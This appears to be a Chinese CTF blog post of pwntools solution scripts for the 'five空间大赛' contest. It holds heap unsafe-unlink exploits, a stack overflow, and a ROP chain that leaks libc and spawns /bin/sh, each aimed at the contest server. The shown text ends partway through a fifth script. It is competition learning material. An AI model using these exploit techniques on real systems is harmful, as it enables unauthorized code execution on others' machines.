@@ -1,0 +1,717 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>five空间大赛 | Whali3n51&#39;s blog</title>
+  <meta name="keywords" content=" pwn ">
+  <meta name="description" content="five空间大赛 | Whali3n51&#39;s blog">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="立雪1234567891011121314151617181920212223242526272829303132333435from pwn import *context.log_level=&amp;apos;debug&amp;apos;#p=process(&amp;apos;.&#x2F;pwn15&amp;apos;)p=remote(&amp;apos;111.33.164.6&amp;apos;, 50015)def create(size,content):	p.sendlineafter(&amp;apos;">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="five空间大赛">
+<meta property="og:url" content="http:&#x2F;&#x2F;whali3n51.github.io&#x2F;2019&#x2F;09&#x2F;01&#x2F;five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B&#x2F;index.html">
+<meta property="og:site_name" content="Whali3n51&#39;s blog">
+<meta property="og:description" content="立雪1234567891011121314151617181920212223242526272829303132333435from pwn import *context.log_level=&amp;apos;debug&amp;apos;#p=process(&amp;apos;.&#x2F;pwn15&amp;apos;)p=remote(&amp;apos;111.33.164.6&amp;apos;, 50015)def create(size,content):	p.sendlineafter(&amp;apos;">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-11-12T08:48:01.105Z">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Whali3n51</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="email" href="mailto:Whali3n51@gmail.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1453872020&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+<a class="more-menus">更多菜单</a>
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(17)</small></div></li>
+    
+        
+            
+            <li><div data-rel="pwn学习">pwn学习<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="RE">RE<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="密码学">密码学<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Writeup">Writeup<small>(6)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="其他">其他<small>(2)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/Whali3n51">github</a>
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="17">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://www.kkzevip.com/">MoR03r</a></li>
+            
+            <li><a target="_blank" href="https://pdsdt.ginkgoteam.com/">Pdsdt</a></li>
+            
+            <li><a target="_blank" href="http://www.dongzt.cn/">Alkaid</a></li>
+            
+            <li><a target="_blank" href="https://www.virzz.com/">Virink’s Blog</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color5">WP复现</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color4">pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color1">re_wp</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a href="javascript:" target="_blank" rel="noopener" class="color5">re复现</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="pwn学习 "
+           href="/2019/05/18/CN16/"
+           data-tag="WP复现"
+           data-author="" >
+            <span class="post-title" title="CISCN_final_CN16">CISCN_final_CN16</span>
+            <span class="post-date" title="2019-05-18 07:04:35">2019/05/18</span>
+        </a>
+        
+        <a  class="其他 "
+           href="/2019/08/30/%E5%85%B3%E4%BA%8EWin10%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B01903%E4%B9%8B%E5%90%8E%E5%8F%AA%E8%83%BD%E6%96%B0%E5%BB%BA%E6%96%87%E4%BB%B6%E5%A4%B9/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="关于Win10自动更新1903之后只能新建文件夹">关于Win10自动更新1903之后只能新建文件夹</span>
+            <span class="post-date" title="2019-08-30 10:08:00">2019/08/30</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/09/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6PWN(2)/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="攻防世界高手进阶PWN（２）">攻防世界高手进阶PWN（２）</span>
+            <span class="post-date" title="2019-09-01 11:09:00">2019/09/01</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/09/01/five%E7%A9%BA%E9%97%B4%E5%A4%A7%E8%B5%9B/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="five空间大赛">five空间大赛</span>
+            <span class="post-date" title="2019-09-01 11:22:00">2019/09/01</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/28/%E7%AE%80%E5%8D%95%E8%AE%B2%E8%A7%A3%E9%80%9A%E8%BF%87extend_overlopping%E6%9D%A5%E5%88%A9%E7%94%A8fast%20bin%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E4%BD%8D%E7%BD%AE%E7%9A%84%E8%AF%BB%E5%86%99/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="简单讲解通过extend_overlopping来利用fast bin实现任意位置的读写">简单讲解通过extend_overlopping来利用fast bin实现任意位置的读写</span>
+            <span class="post-date" title="2019-05-28 12:25:00">2019/05/28</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/05/28/%E7%8E%B0%E4%BB%A3unlink%E6%BC%8F%E6%B4%9E%E8%AE%B2%E8%A7%A3%E4%B8%8E%E5%88%A9%E7%94%A8/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="现代unlink漏洞讲解与利用">现代unlink漏洞讲解与利用</span>
+            <span class="post-date" title="2019-05-28 12:56:00">2019/05/28</span>
+        </a>
+        
+        <a  class="密码学 "
+           href="/2019/05/28/RC4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="RC4加密算法的原理讲解">RC4加密算法的原理讲解</span>
+            <span class="post-date" title="2019-05-28 16:46:00">2019/05/28</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2019/05/28/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91testre/"
+           data-tag="re复现"
+           data-author="" >
+            <span class="post-title" title="西湖论剑testre">西湖论剑testre</span>
+            <span class="post-date" title="2019-05-28 22:15:00">2019/05/28</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2019/05/29/%E6%A1%82%E7%94%B5RE%E5%85%A8%E8%A7%A3WriteUp/"
+           data-tag="re_wp"
+           data-author="" >
+            <span class="post-title" title="桂电RE全解WriteUp">桂电RE全解WriteUp</span>
+            <span class="post-date" title="2019-05-29 13:23:00">2019/05/29</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/05/31/%E5%BC%BA%E7%BD%91%E6%9D%AF%EF%BC%9A%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B_AP_Pwn%20%20writeup/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="强网杯：强网先锋_AP_Pwn  writeup">强网杯：强网先锋_AP_Pwn  writeup</span>
+            <span class="post-date" title="2019-05-31 13:07:00">2019/05/31</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/06/02/Unsorted%20bin%20attack/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="Unsorted bin attack">Unsorted bin attack</span>
+            <span class="post-date" title="2019-06-02 17:54:00">2019/06/02</span>
+        </a>
+        
+        <a  class="其他 "
+           href="/2019/09/01/%E7%BB%99%E6%96%B0%E7%94%9F%E2%80%94%E5%85%B3%E4%BA%8E%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%8E%E4%B9%88%E5%AD%A6%E4%B9%A0/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="给新生—关于二进制怎么学习">给新生—关于二进制怎么学习</span>
+            <span class="post-date" title="2019-09-01 12:41:00">2019/09/01</span>
+        </a>
+        
+        <a  class="pwn学习 "
+           href="/2019/06/04/%E5%A0%86%E6%BA%A2%E5%87%BA%E7%9A%84unlink%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="堆溢出的unlink漏洞利用">堆溢出的unlink漏洞利用</span>
+            <span class="post-date" title="2019-06-04 14:41:00">2019/06/04</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/06/13/CISCN%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BApwn%E8%84%9A%E6%9C%AC%E5%8F%8A%E6%80%BB%E7%BB%93/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="CISCN华北赛区pwn脚本及总结">CISCN华北赛区pwn脚本及总结</span>
+            <span class="post-date" title="2019-06-13 20:01:00">2019/06/13</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8PWN_wp/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="上海大学生网络安全PWN_wp">上海大学生网络安全PWN_wp</span>
+            <span class="post-date" title="2019-11-11 13:37:00">2019/11/11</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/HECTF/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="HECTF_Pwn_wp">HECTF_Pwn_wp</span>
+            <span class="post-date" title="2019-11-11 13:51:00">2019/11/11</span>
+        </a>
+        
+        <a  class="Writeup "
+           href="/2019/11/11/%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwn_wp/"
+           data-tag="pwn"
+           data-author="" >
+            <span class="post-title" title="湖湘杯线上赛pwn_wp">湖湘杯线上赛pwn_wp</span>
+            <span class="post-date" title="2019-11-11 14:14:00">2019/11/11</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-five空间大赛" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">five空间大赛</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a href="javascript:" target="_blank" data-rel="Writeup noopener">Writeup</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a href="javascript:" target="_blank" rel="noopener" class="color4">pwn</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2019-11-12 16:48:01'>2019-09-01 11:22</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#立雪"><span class="toc-text">立雪</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正定"><span class="toc-text">正定</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一苇"><span class="toc-text">一苇</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#拈花"><span class="toc-text">拈花</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#坐忘"><span class="toc-text">坐忘</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#玄冥"><span class="toc-text">玄冥</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#於讴"><span class="toc-text">於讴</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#副墨"><span class="toc-text">副墨</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="立雪"><a href="#立雪" class="headerlink" title="立雪"></a>立雪</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn15')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50015</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Length of note:"</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Content of note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">'Length of note:'</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">'Content of note:'</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'Index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'aa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'bb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">chunk0_addr=<span class="number">0x006020C0</span></span><br><span class="line">admin=<span class="number">0x602088</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(admin)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),p64(<span class="number">0x7E4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">'Your choice:'</span>,<span class="string">'2019'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="正定"><a href="#正定" class="headerlink" title="正定"></a>正定</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process('./pwn14')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>, <span class="number">50014</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Size of note : "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Content of note:"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line">	p.sendlineafter(<span class="string">"Size of note : "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">'Content of note : '</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Index :"</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'aa'</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'bb'</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">'dd'</span>)<span class="comment">#3</span></span><br><span class="line">create(<span class="number">0x30</span>,<span class="string">'ee'</span>)<span class="comment">#4</span></span><br><span class="line">chunk0_addr=<span class="number">0x4040C0</span></span><br><span class="line">admin=<span class="number">0x4040A0</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0xf0</span>)+p64(chunk0_addr<span class="number">-0x18</span>)+p64(chunk0_addr<span class="number">-0x10</span>)</span><br><span class="line">payload+=(<span class="number">0xf8</span><span class="number">-5</span>*<span class="number">8</span>)*<span class="string">'a'</span>+p64(<span class="number">0xf0</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x100</span>)+p64(admin)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),p64(<span class="number">0x7E4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"Your choice : "</span>,<span class="string">'70'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="一苇"><a href="#一苇" class="headerlink" title="一苇"></a>一苇</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./pwn13')</span></span><br><span class="line">p=remote(<span class="string">'111.33.164.6'</span>,<span class="number">50013</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+<span class="string">'\x50'</span></span><br><span class="line">p.sendafter(<span class="string">"input massage\n"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="拈花"><a href="#拈花" class="headerlink" title="拈花"></a>拈花</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#p=process("./pwn11")</span></span><br><span class="line"><span class="comment">#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="number">50011</span>)</span><br><span class="line">libc=ELF(<span class="string">"libc-2.19.so"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"please input your name\n"</span>,<span class="string">"A"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn11"</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">"puts"</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x4012ab</span></span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">40</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(<span class="number">0x401080</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">"ail!\n"</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))-libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">p.sendlineafter(<span class="string">"please input your name\n"</span>,<span class="string">"A"</span>)</span><br><span class="line">system_addr=libc.symbols[<span class="string">"system"</span>]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line">payload=<span class="string">'B'</span>*<span class="number">40</span></span><br><span class="line">payload+=p64(<span class="number">0x4012A2</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(elf.got[<span class="string">"read"</span>])</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(<span class="number">0x401288</span>)</span><br><span class="line">payload+=<span class="string">'B'</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(pop_rdi_ret)</span><br><span class="line">payload+=p64(elf.bss()+<span class="number">0x100</span>)</span><br><span class="line">payload+=p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="坐忘"><a href="#坐忘" class="headerlink" title="坐忘"></a>坐忘</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#p=process("./pwn9")</span></span><br><span class="line">p=remote(<span class="string">"111.33.164.6"</span>,<span class="string">"50009"</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn9"</span>)</span><br><span class="line">mprotect=elf.symbols[<span class="string">"mprotect"</span>]</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">9</span></span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.recvuntil(<span class="string">"welcome to base64 decode server\n"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;\n"</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"decode res:\n"</span>)</span><br><span 